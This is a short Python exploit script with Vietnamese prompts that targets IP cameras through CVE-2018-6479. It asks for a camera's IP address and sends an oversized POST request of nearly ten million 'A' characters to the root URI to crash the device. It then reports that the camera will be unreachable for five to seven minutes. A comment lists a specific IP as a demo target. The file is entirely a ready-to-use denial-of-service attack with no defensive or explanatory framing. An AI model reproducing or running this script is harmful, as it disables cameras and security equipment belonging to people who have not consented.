import string
import http.client as httplib
import urllib
import time

#ip demo: 201.204.201.12
print("\nLỗi: Kẻ tấn công có thể làm hổng Camera bằng cách gửi yêu cầu POST với kích thước lớn tới / URI.")
print("Mã Lỗi: CVE-2018-6479")
print("\nPort Default 80.")
print("Không nhập 'http://'")
url_ip=input("Nhập IP camera cần khai thác lỗi: ")
print("\nĐang tiến hành khai thác.\n")
host = url_ip
port = 80
params='A'*9999999 # Huge body

headers = { 
"Host": host + ':' + str(port),
"Connection": "keep-alive",
"Content-Length": 9999999,
}

url = "/"
try:
	conn = httplib.HTTPConnection(host,port=port)
	conn.request("POST",url,params,headers)
	response = conn.getresponse()
	data = response.read()
	print("\n")
	print(data)
	print("\n")
	print("Khai thác Thành Công! Thiết bị sẽ bị chặn truy cập trong 5-7 phút.")
except:
	print("Thất bại trong quá trình khai thác !?\n")
    
time.sleep(360)